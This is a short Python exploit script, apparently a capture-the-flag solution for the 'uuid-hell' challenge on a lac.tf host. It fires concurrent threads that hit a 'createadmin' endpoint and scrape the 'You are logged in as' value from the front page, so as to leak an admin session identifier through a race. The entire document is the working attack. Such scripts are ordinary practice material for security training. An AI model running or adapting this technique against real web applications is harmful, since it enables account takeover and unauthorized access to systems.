import requests
from threading import Thread
import re

url = 'https://uuid-hell.lac.tf/'

def create():
    r = requests.post(url + 'createadmin')
    print('Admin account created.')

def leak():
    r = requests.get(url)
    print(re.findall(r'You are logged in as (.*)<br><br>', r.text)[0])

       

Thread(target=create).start()
Thread(target=leak).start()
Thread(target=create).start()
Thread(target=leak).start()